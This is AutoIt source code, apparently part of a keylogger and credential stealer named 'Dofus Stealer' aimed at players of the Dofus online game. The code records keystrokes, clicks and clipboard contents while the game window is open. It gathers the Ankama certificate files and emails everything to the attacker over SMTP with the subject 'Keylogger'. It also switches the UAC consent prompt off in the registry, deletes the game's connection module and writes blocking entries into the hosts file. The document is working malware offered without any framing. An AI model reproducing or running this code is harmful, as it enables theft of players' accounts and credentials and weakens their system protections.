 FUNC _KEYRECEIVE ( )
 $LAST = @HOTKEYPRESSED
 HOTKEYSET ( $LAST )
 SEND ( $LAST )
 HOTKEYSET ( $LAST , "_KeyReceive" )
 SWITCH $LAST
 CASE "{NUMPAD0}"
 $LAST = "0"
 CASE "{NUMPAD1}"
 $LAST = "1"
 CASE "{NUMPAD2}"
 $LAST = "2"
 CASE "{NUMPAD3}"
 $LAST = "3"
 CASE "{NUMPAD4}"
 $LAST = "4"
 CASE "{NUMPAD5}"
 $LAST = "5"
 CASE "{NUMPAD6}"
 $LAST = "6"
 CASE "{NUMPAD7}"
 $LAST = "7"
 CASE "{NUMPAD8}"
 $LAST = "8"
 CASE "{NUMPAD9}"
 $LAST = "9"
 CASE "{BS}"
 $LAST = "[BACK]"
 CASE "{TAB}"
 $LAST = "[TAB]"
 CASE "+ "
 $LAST = " "
 CASE "{!}"
 $LAST = "!"
 CASE "{^}"
 $LAST = "^"
 CASE "{+}"
 $LAST = "+"
 CASE "{NUMPADMULT}"
 $LAST = "*"
 CASE "{NUMPADADD}"
 $LAST = "+"
 CASE "{NUMPADSUB}"
 $LAST = "-"
 CASE "{NUMPADDIV}"
 $LAST = "/"
 CASE "{NUMPADDOT}"
 $LAST = "."
 ENDSWITCH
 $TOUCHES = $TOUCHES & $LAST
 ENDFUNC
 FUNC _INETSMTPMAILCOM ( $S_SMTPSERVER , $S_FROMNAME , $S_FROMADDRESS , $S_TOADDRESS , $S_SUBJECT = "" , $AS_BODY = "" , $S_ATTACHFILES = "" , $S_CCADDRESS = "" , $S_BCCADDRESS = "" , $S_IMPORTANCE = "Normal" , $S_USERNAME = "" , $S_PASSWORD = "" , $IPPORT = 25 , $SSL = 0 )
 LOCAL $OBJEMAIL = OBJCREATE ( "CDO.Message" )
 $OBJEMAIL.From = """" & $S_FROMNAME & """ <" & $S_FROMADDRESS & ">"
 $OBJEMAIL.To = $S_TOADDRESS
 IF $S_CCADDRESS <> "" THEN $OBJEMAIL.Cc = $S_CCADDRESS
 IF $S_BCCADDRESS <> "" THEN $OBJEMAIL.Bcc = $S_BCCADDRESS
 $OBJEMAIL.Subject = $S_SUBJECT
 IF STRINGINSTR ( $AS_BODY , "<" ) AND STRINGINSTR ( $AS_BODY , ">" ) THEN
 $OBJEMAIL.HTMLBody = $AS_BODY
 ELSE
 $OBJEMAIL.Textbody = $AS_BODY & @CRLF
 ENDIF
 IF $S_ATTACHFILES <> "" THEN
 LOCAL $S_FILES2ATTACH = STRINGSPLIT ( $S_ATTACHFILES , ";" )
 FOR $X = 1 TO $S_FILES2ATTACH [ 0 ]
 $S_FILES2ATTACH [ $X ] = _PATHFULL ( $S_FILES2ATTACH [ $X ] )
 CONSOLEWRITE ( "@@ Debug(62) : $S_Files2Attach = " & $S_FILES2ATTACH [ $X ] & @LF & ">Error code: " & @ERROR & @LF )
 IF FILEEXISTS ( $S_FILES2ATTACH [ $X ] ) THEN
 $OBJEMAIL.AddAttachment ( $S_FILES2ATTACH [ $X ] )
 ELSE
 CONSOLEWRITE ( "!> File not found to attach: " & $S_FILES2ATTACH [ $X ] & @LF )
 SETERROR ( 1 )
 RETURN 0
 ENDIF
 NEXT
 ENDIF
 $OBJEMAIL.Configuration.Fields.Item ( "http://schemas.microsoft.com/cdo/configuration/sendusing" ) = 2
 $OBJEMAIL.Configuration.Fields.Item ( "http://schemas.microsoft.com/cdo/configuration/smtpserver" ) = $S_SMTPSERVER
 IF NUMBER ( $IPPORT ) = 0 THEN $IPPORT = 25
 $OBJEMAIL.Configuration.Fields.Item ( "http://schemas.microsoft.com/cdo/configuration/smtpserverport" ) = $IPPORT
 IF $S_USERNAME <> "" THEN
 $OBJEMAIL.Configuration.Fields.Item ( "http://schemas.microsoft.com/cdo/configuration/smtpauthenticate" ) = 1
 $OBJEMAIL.Configuration.Fields.Item ( "http://schemas.microsoft.com/cdo/configuration/sendusername" ) = $S_USERNAME
 $OBJEMAIL.Configuration.Fields.Item ( "http://schemas.microsoft.com/cdo/configuration/sendpassword" ) = $S_PASSWORD
 ENDIF
 IF $SSL THEN
 $OBJEMAIL.Configuration.Fields.Item ( "http://schemas.microsoft.com/cdo/configuration/smtpusessl" ) = TRUE
 ENDIF
 $OBJEMAIL.Configuration.Fields.Update
 $OBJEMAIL.Fields.Item ( "urn:schemas:mailheader:Importance" ) = "High"
 $OBJEMAIL.Fields.Update
 $OBJEMAIL.Send
 $OBJEMAIL = ""
 ENDFUNC
 FUNC _SEARCHCERTIFS ( )
 $CERTIFS = ""
 LOCAL $SEARCH = FILEFINDFIRSTFILE ( @APPDATADIR & "\AnkamaCertificates\*.*" )
 IF $SEARCH <> - 1 THEN
 WHILE 1
 LOCAL $FILE = FILEFINDNEXTFILE ( $SEARCH )
 IF @ERROR THEN EXITLOOP
 IF ( $CERTIFS = "" ) THEN
 $CERTIFS = @APPDATADIR & "\AnkamaCertificates\" & $FILE
 ELSE
 $CERTIFS = $CERTIFS & ";" & @APPDATADIR & "\AnkamaCertificates\" & $FILE
 ENDIF
 WEND
 ENDIF
 FILECLOSE ( $SEARCH )
 ENDFUNC
 FUNC _TOGGLE_UAC ( $IVALUE = - 2 )
 IF NOT ISADMIN ( ) THEN RETURN SETERROR ( 1 , 0 , - 1 )
 IF NOT STRINGINSTR ( "WIN_VISTA|WIN_7" , @OSVERSION ) THEN RETURN SETERROR ( 2 , 0 , - 1 )
 LOCAL $SHKLM , $SNAME , $IREADVALUE , $INEWVALUE
 $SHKLM = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 $SNAME = "ConsentPromptBehaviorAdmin"
 $IREADVALUE = REGREAD ( $SHKLM , $SNAME )
 IF @ERROR THEN RETURN SETERROR ( 3 , @ERROR , - 1 )
 SWITCH $IVALUE
 CASE - 1 , - 2
 SWITCH $IREADVALUE
 CASE 0
 $INEWVALUE = ABS ( $IVALUE )
 CASE ELSE
 $INEWVALUE = 0
 ENDSWITCH
 CASE - 3
 RETURN SETERROR ( 0 , 0 , $IREADVALUE )
 CASE 0 , 1 , 2
 $INEWVALUE = $IVALUE
 CASE ELSE
 RETURN SETERROR ( 5 , 0 , - 1 )
 ENDSWITCH
 REGWRITE ( $SHKLM , $SNAME , "REG_DWORD" , $INEWVALUE )
 IF @ERROR THEN RETURN SETERROR ( 4 , @ERROR , - 1 )
 RETURN SETERROR ( 0 , 0 , $IREADVALUE )
 ENDFUNC
 FUNC _WINDOW ( $WIN = "Dofus" )
 IF WINEXISTS ( $WIN ) AND WINGETHANDLE ( $WIN ) <> WINGETHANDLE ( "Dofus Stealer" ) THEN
 FOR $ELEMENT IN $KEYS
 HOTKEYSET ( $ELEMENT , "_KeyReceive" )
 NEXT
 WHILE WINEXISTS ( $WIN )
 IF _ISPRESSED ( "01" ) AND STRINGRIGHT ( $TOUCHES , 1 ) <> "]" THEN
 $TOUCHES = $TOUCHES & "[CLIC]"
 ENDIF
 WEND
 FOR $ELEMENT IN $KEYS
 HOTKEYSET ( $ELEMENT )
 NEXT
 IF $TOUCHES <> "" AND $TOUCHES <> "[CLIC]" THEN
 $TOUCHES = @COMPUTERNAME & @CRLF & @CRLF & "Dofus" & @CRLF & "-----" & @CRLF & $TOUCHES & @CRLF & "-----" & @CRLF & @CRLF & "Presse-papier: " & CLIPGET ( )
 IF $SCREEN <> "" AND STRINGLEFT ( $SCREEN , 1 ) <> ";" THEN $SCREEN = ";" & $SCREEN
 _INETSMTPMAILCOM ( $SMTP , "" , $ENVOIE , $RECOIT , "Keylogger - " & @COMPUTERNAME , $TOUCHES , $CERTIFS & $SCREEN , "" , "" , "Normal" , $ENVOIE , $MDP , 465 , 1 )
 $TOUCHES = ""
 $SCREEN = ""
 ENDIF
 ENDIF
 ENDFUNC
 FUNC _DELMODULE ( )
 LOCAL $MODULE = ""
 IF FILEEXISTS ( @APPDATADIR & "\Dofus2\Module_Ankama_Connection.dat" ) THEN
 $MODULE = @APPDATADIR & "\Dofus2\Module_Ankama_Connection.dat"
 ELSEIF FILEEXISTS ( @APPDATADIR & "\Dofus 2\Module_Ankama_Connection.dat" ) THEN
 $MODULE = @APPDATADIR & "\Dofus 2\Module_Ankama_Connection.dat"
 ENDIF
 IF FILEEXISTS ( $MODULE ) THEN
 FILEDELETE ( $MODULE )
 ENDIF
 ENDFUNC
 FUNC _BLOCK ( $URL )
 LOCAL $FILE = FILEOPEN ( "C:\Windows\System32\drivers\etc\hosts" , 1 )
 IF $FILE <> - 1 THEN FILEWRITE ( $FILE , @CRLF & "127.0.0.1	" & $URL )
 FILECLOSE ( $FILE )
 ENDFUNC
 FUNC _PROCESSGETWIN ( $PROCESS )
 IF PROCESSEXISTS ( $PROCESS ) THEN
 LOCAL $WINLIST = WINLIST ( )
 LOCAL $PID = PROCESSLIST ( $PROCESS )
 LOCAL $RETURN = 0
 IF $WINLIST [ 0 ] [ 0 ] <> 0 THEN
 FOR $I = 0 TO $WINLIST [ 0 ] [ 0 ] - 1 STEP 1
 $X = WINGETPROCESS ( $WINLIST [ $I ] [ 0 ] )
 $STATE = WINGETSTATE ( $WINLIST [ $I ] [ 0 ] )
 IF $PID [ 1 ] [ 1 ] = $X AND BITAND ( $STATE , 2 ) THEN $RETURN = $WINLIST [ $I ] [ 0 ]
 NEXT
 ENDIF
 RETURN $RETURN
 ELSE
 RETURN - 1
 ENDIF
 ENDFUNC
